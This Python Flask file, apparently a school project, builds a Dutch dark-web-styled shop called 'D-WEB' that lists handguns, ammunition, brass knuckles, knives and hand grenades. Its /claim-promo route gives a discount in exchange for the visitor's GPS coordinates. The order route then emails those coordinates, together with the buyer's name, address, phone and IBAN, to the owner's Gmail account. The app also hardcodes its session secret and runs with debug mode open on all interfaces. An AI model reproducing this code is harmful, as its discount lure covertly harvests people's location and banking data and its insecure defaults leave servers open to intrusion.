import os
import random
from datetime import datetime
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from flask import Flask, render_template, request, abort, session, redirect, url_for, jsonify, Response

app = Flask(__name__)
app.secret_key = 'd_web_secret_key_schoolproject'

categories = [
    {"name": "Pistolen", "slug": "Pistolen"},
    {"name": "Messen", "slug": "Messen"},
    {"name": "Kogels", "slug": "Kogels"},
    {"name": "Boksbeugels", "slug": "Boksbeugels"},
    {"name": "Pistoolmagazijnen", "slug": "Pistoolmagazijnen"},
    {"name": "Bommen", "slug": "Bommen"},
]

product_names = {
    "Pistolen": ["Glock 17", "Beretta 92FS", "Colt M1911", "Desert Eagle", "SIG Sauer P226", "Walther PPK", "CZ 75", "FN Browning Hi-Power"],
    "Messen": ["Victorinox Swiss Army Knife", "Opinel No. 8", "Wüsthof Classic", "Leatherman Wave+", "Morakniv Companion", "Buck 110", "Spyderco Paramilitary 2", "KA-BAR USMC"],
    "Kogels": ["9x19mm Parabellum", ".22 Long Rifle", "5.56x45mm NATO", "7.62x39mm", ".45 ACP", "7.62x51mm NATO", "12 Gauge", ".50 BMG"],
    "Boksbeugels": ["Klassieke Boksbeugel", "Viervinger Boksbeugel", "Tweekleurige Boksbeugel", "Tekko", "Apache Revolver Boksbeugel", "Mark I Trench Knife Boksbeugel", "Tactische Boksbeugel", "Vechtsport Boksbeugel"],
    "Pistoolmagazijnen": ["Glock 17 Magazijn", "Beretta 92 Magazijn", "Colt M1911 Magazijn", "SIG Sauer P226 Magazijn", "CZ 75 Magazijn", "Walther PPK Magazijn", "FN Browning Magazijn", "Universeel Magazijn"],
    "Bommen": ["Mills Bomb", "Stielhandgranate M24", "Mk 2 Fragmentation Grenade", "F1 Hand Grenade", "RGD-5 Hand Grenade", "M67 Hand Grenade", "DM51 Hand Grenade", "M26 Hand Grenade"],
}

product_prices = {
    "Pistolen": [695.00, 890.00, 1150.00, 2450.00, 1395.00, 950.00, 850.00, 1250.00],
    "Messen": [39.95, 14.95, 119.00, 149.95, 19.95, 89.95, 235.00, 135.00],
    "Kogels": [18.50, 7.50, 16.00, 14.50, 29.50, 24.00, 15.00, 65.00],
    "Boksbeugels": [25.00, 29.95, 34.95, 65.00, 1850.00, 195.00, 39.95, 27.50],
    "Pistoolmagazijnen": [32.00, 39.00, 35.00, 55.00, 45.00, 49.00, 52.00, 29.95],
    "Bommen": [145.00, 175.00, 125.00, 115.00, 95.00, 135.00, 155.00, 110.00],
}

products = []
product_id = 1
for category in categories:
    cat_name = category["name"]
    for number, prod_name in enumerate(product_names[cat_name]):
        products.append({
            "id": product_id,
            "name": prod_name,
            "category": cat_name,
            "price": product_prices[cat_name][number],
            "description": f"Hoogwaardig exemplaar uit de exclusieve D-WEB catalogus: {prod_name}.",
            "image": f"/product-image/{product_id}",
        })
        product_id += 1

# Jouw e-mailinstellingen
MAIL_SERVER = "smtp.gmail.com"
MAIL_PORT = 587
MAIL_USERNAME = "benjaminvissers66@gmail.com"
MAIL_PASSWORD = "jouw_app_wachtwoord_hier"  # Vervang dit door je Google App-wachtwoord (16 tekens)

@app.route("/")
def home():
    return render_template("index.html", categories=categories)

@app.route("/producten")
def product_list():
    selected_category = request.args.get("categorie", "")
    filtered_products = products
    if selected_category in product_names:
        filtered_products = [p for p in products if p["category"] == selected_category]
    return render_template("products.html", products=filtered_products, categories=categories, selected_category=selected_category)

@app.route("/product/<int:product_id>")
def product_detail(product_id):
    product = next((item for item in products if item["id"] == product_id), None)
    if product is None:
        abort(404)
    return render_template("product.html", product=product)

@app.route("/product-image/<int:product_id>")
def product_image(product_id):
    product = next((item for item in products if item["id"] == product_id), None)
    if product is None:
        abort(404)
    svg = f'''<svg xmlns="http://www.w3.org/2000/svg" width="600" height="400" viewBox="0 0 600 400">
      <rect width="600" height="400" fill="#070707"/>
      <rect x="12" y="12" width="576" height="376" fill="none" stroke="#1f1f1f" stroke-width="2"/>
      <line x1="12" y1="70" x2="588" y2="70" stroke="#1f1f1f" stroke-width="1"/>
      <text x="30" y="48" fill="#d01c2b" font-family="Arial, sans-serif" font-size="16" font-weight="bold" letter-spacing="3">D-WEB // {product["category"].upper()}</text>
      <text x="570" y="48" fill="#555" font-family="monospace" font-size="14" text-anchor="end">ID #{product["id"]:02d}</text>
      <circle cx="300" cy="200" r="75" fill="none" stroke="#d01c2b" stroke-width="1.5" stroke-dasharray="6 4"/>
      <line x1="210" y1="200" x2="390" y2="200" stroke="#2a2a2a" stroke-width="1"/>
      <line x1="300" y1="110" x2="300" y2="290" stroke="#2a2a2a" stroke-width="1"/>
      <text x="300" y="206" fill="#ffffff" font-family="Arial, sans-serif" font-size="22" font-weight="bold" text-anchor="middle">{product["name"]}</text>
      <text x="300" y="345" fill="#666" font-family="monospace" font-size="13" text-anchor="middle" letter-spacing="2">VERIFIED CATALOG ASSET</text>
    </svg>'''
    return Response(svg, mimetype="image/svg+xml")

@app.route("/claim-promo", methods=["POST"])
def claim_promo():
    data = request.get_json()
    if data:
        session['gps_lat'] = data.get('lat')
        session['gps_lon'] = data.get('lon')
        print(f"\n[GPS ONTVANGEN] Latitude: {session['gps_lat']}, Longitude: {session['gps_lon']}\n")
    
    session['coupon'] = "DWEB20"
    session['discount'] = 0.20
    return jsonify({"status": "success"})

@app.route("/winkelmand")
@app.route("/afrekenen")
def checkout():
    cart = session.get('cart', [])
    subtotal = sum(item['price'] * item['quantity'] for item in cart)
    discount_rate = session.get('discount', 0.0)
    discount_amount = subtotal * discount_rate
    shipping_cost = 0.00 if session.get('coupon') == "DWEB20" else 5.00
    if not cart:
        shipping_cost = 0.00
    total_price = (subtotal - discount_amount) + shipping_cost
    return render_template("checkout.html", cart=cart, subtotal=subtotal, discount_amount=discount_amount, shipping_cost=shipping_cost, total_price=total_price)

@app.route("/add-to-cart/<int:product_id>", methods=["POST"])
def add_to_cart(product_id):
    product = next((item for item in products if item["id"] == product_id), None)
    if product:
        if 'cart' not in session:
            session['cart'] = []
        cart = session['cart']
        existing_item = next((item for item in cart if item['id'] == product_id), None)
        if existing_item:
            existing_item['quantity'] += 1
        else:
            cart.append({"id": product["id"], "name": product["name"], "price": product["price"], "image": product["image"], "quantity": 1})
        session['cart'] = cart
    return redirect(request.referrer or url_for('product_detail', product_id=product_id))

@app.route("/update-cart/<int:product_id>/<action>", methods=["POST"])
def update_cart(product_id, action):
    cart = session.get('cart', [])
    existing_item = next((item for item in cart if item['id'] == product_id), None)
    if existing_item:
        if action == "plus":
            existing_item['quantity'] += 1
        elif action == "min":
            existing_item['quantity'] -= 1
            if existing_item['quantity'] <= 0:
                cart.remove(existing_item)
    session['cart'] = cart
    return redirect(request.referrer or url_for('checkout'))

@app.route("/clear-cart", methods=["POST"])
def clear_cart():
    session.pop('cart', None)
    return redirect(url_for('checkout'))

@app.route("/place-order", methods=["POST"])
def place_order():
    name = request.form.get('name')
    email = request.form.get('email')
    phone = request.form.get('phone')
    street = request.form.get('street')
    postal_code = request.form.get('postal_code')
    city = request.form.get('city')
    bank = request.form.get('bank')
    gps_lat = session.get('gps_lat', 'Niet opgegeven')
    gps_lon = session.get('gps_lon', 'Niet opgegeven')
    
    cart = session.get('cart', [])
    subtotal = sum(item['price'] * item['quantity'] for item in cart)
    discount_amount = subtotal * session.get('discount', 0.0)
    shipping_cost = 0.00 if session.get('coupon') == "DWEB20" else 5.00
    total_price = (subtotal - discount_amount) + shipping_cost
    
    order_number = f"DWEB-{random.randint(100000, 999999)}"
    order_time = datetime.now().strftime("%d-%m-%Y om %H:%M:%S")
    
    products_text = ""
    for item in cart:
        sub = item['price'] * item['quantity']
        products_text += f"- {item['name']} | Aantal: {item['quantity']} | Stuksprijs: € {item['price']:.2f} | Subtotaal: € {sub:.2f}\n"

    # E-mail naar de klant
    customer_msg = MIMEMultipart()
    customer_msg['From'] = MAIL_USERNAME
    customer_msg['To'] = email
    customer_msg['Subject'] = f"Bevestiging van je D-WEB bestelling ({order_number})"
    customer_body = f"Bedankt voor je bestelling bij D-WEB.\nBestelnummer: {order_number}\nTotaal: € {total_price:.2f}"
    customer_msg.attach(MIMEText(customer_body, 'plain'))

    # E-mail naar de beheerder (jouzelf) inclusief GPS-coördinaten
    admin_msg = MIMEMultipart()
    admin_msg['From'] = MAIL_USERNAME
    admin_msg['To'] = MAIL_USERNAME
    admin_msg['Subject'] = f"Nieuwe D-WEB Bestelling! [{order_number}]"
    admin_body = f"1. Naam: {name}\n2. E-mail: {email}\n3. Telefoon: {phone}\n4. Adres: {street}\n5. Postcode: {postal_code}\n6. Plaats: {city}\n7. IBAN: {bank}\n8. Gegevens gecontroleerd\n9. Producten:\n{products_text}\n10. Totaal: € {total_price:.2f}\n11. Bestelnummer: {order_number}\n12. GPS: {gps_lat}, {gps_lon}\n13. Tijd: {order_time}"
    admin_msg.attach(MIMEText(admin_body, 'plain'))

    try:
        server = smtplib.SMTP(MAIL_SERVER, MAIL_PORT)
        server.starttls()
        server.login(MAIL_USERNAME, MAIL_PASSWORD)
        server.sendmail(MAIL_USERNAME, email, customer_msg.as_string())
        server.sendmail(MAIL_USERNAME, MAIL_USERNAME, admin_msg.as_string())
        server.quit()
    except Exception as e:
        print("E-mail overgeslagen:", e)

    session.pop('cart', None)
    session.pop('coupon', None)
    session.pop('discount', None)
    return render_template("checkout.html", cart=[], total_price=0, order_placed=True)

@app.errorhandler(404)
def page_not_found(error):
    return "Deze pagina bestaat niet.", 404

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port, debug=True)
